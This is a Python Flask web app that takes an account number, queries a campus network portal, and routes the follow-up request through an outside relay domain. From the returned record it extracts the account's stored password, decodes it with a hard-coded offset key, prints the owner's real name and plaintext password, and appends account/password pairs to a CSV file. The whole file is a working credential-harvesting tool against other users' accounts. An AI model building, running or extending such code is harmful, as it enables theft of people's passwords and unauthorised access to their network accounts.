from flask import Flask, render_template, request, jsonify
import requests
import re

#创建Flask对象app并初始化
app = Flask(__name__)

#通过python装饰器的方法定义路由地址
@app.route("/")
#定义方法 用jinjia2引擎来渲染页面，并返回一个index.html页面
def root():
    return render_template("index.html")

#app的路由地址"/submit"即为ajax中定义的url地址，采用POST、GET方法均可提交
@app.route("/submit",methods=["GET", "POST"])




#从这里定义具体的函数 返回值均为json格式
def submit():
    #由于POST、GET获取数据的方式不同，需要使用if语句进行判断
    if request.method == "POST":
        name = request.form.get("name")
        age = request.form.get("age")
    if request.method == "GET":
        name = request.args.get("name")
        age = request.args.get("age")
    #如果获取的数据为空
    if name == None:
        print(age)
        return {'message':"success!",'age':age}
    if age == None:
        hao=name
        for i in range(1):
            url='http://8.131.54.75:801/eportal/?c=Portal&a=self&callback=dr1003&self_type=1&user_account='+hao+'&user_password=www&wlan_user_mac=50642baa65d7&wlan_user_ip=10.252.27.108&jsVersion=3.3.3&v=741'
            headers={
                "Accept":"*/*",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Connection":"close",
                "Host":    "192.168.9.18:801",
                "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:55.0) Gecko/20100101 Firefox/55.0"
            }
            respone=requests.get(url,timeout=10,headers=headers)
            a=respone.content

            a=str(a)
            a=a.replace('\\\\/','/')
            a=a.replace('\\/','/')
            pattern = re.compile(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+') # 匹配模式
            url1 = re.findall(pattern,a)
            zhongjianzhi=url1[0].replace('172.28.100.99:80','wzhlovewjq1314.cn:802')

            respone1=requests.get(zhongjianzhi,timeout=10)
            c=respone1.text
            d=re.findall(r'"userRealName":....',c)
            pwdmi=re.findall(r'ssword":"(.*)","userRealName"',c)
    
    

            passwd =[] 
            passwd = [28, 57, 86, 19, 47, 76, 9, 38, 66, 95, 28, 57, 86, 18, 47, 76, 9, 38, 66, 95, 28, 57, 86, 38, 66, 95, 28, 57, 86, 18, 47, 76, 9, 38, 66, 95, 28, 57, 86]
            milist=[]

            pwd=''
            for i in pwdmi[0]:

                milist.append(i)

            e=[]
            f=[]
            g=[]
            k=0
            for i in range(len(milist)):
                try:
                    if (milist[k]=="\\"):
                        k+=1
                except:
                    break
                aaa=int(ord(milist[k]))-int(passwd[i])
                k+=1
                if (aaa<32):
                    aaa+=95
                pwd=pwd+chr(aaa)


    
            try:
                print(d[0][-3::]+"，已登录")
                print('\n')
                print('密码为',pwd[:-1])
            except:
                print("登陆失败")
            print('\n')
            print("登陆链接为")
            print(zhongjianzhi)
            with open(r'密码.csv','a',encoding='utf-8-sig') as f:
                            f.write('{},{}\n'.format(hao,pwd[:-1]))

        return {'message':"success!",'name':pwd[:-1],'username':d[0][-3::]}

#定义app在8080端口运行

app.run(host='0.0.0.0',port=7999,processes=True)# 1.threaded : 多线程支持，默认为False，即不开启多线程;
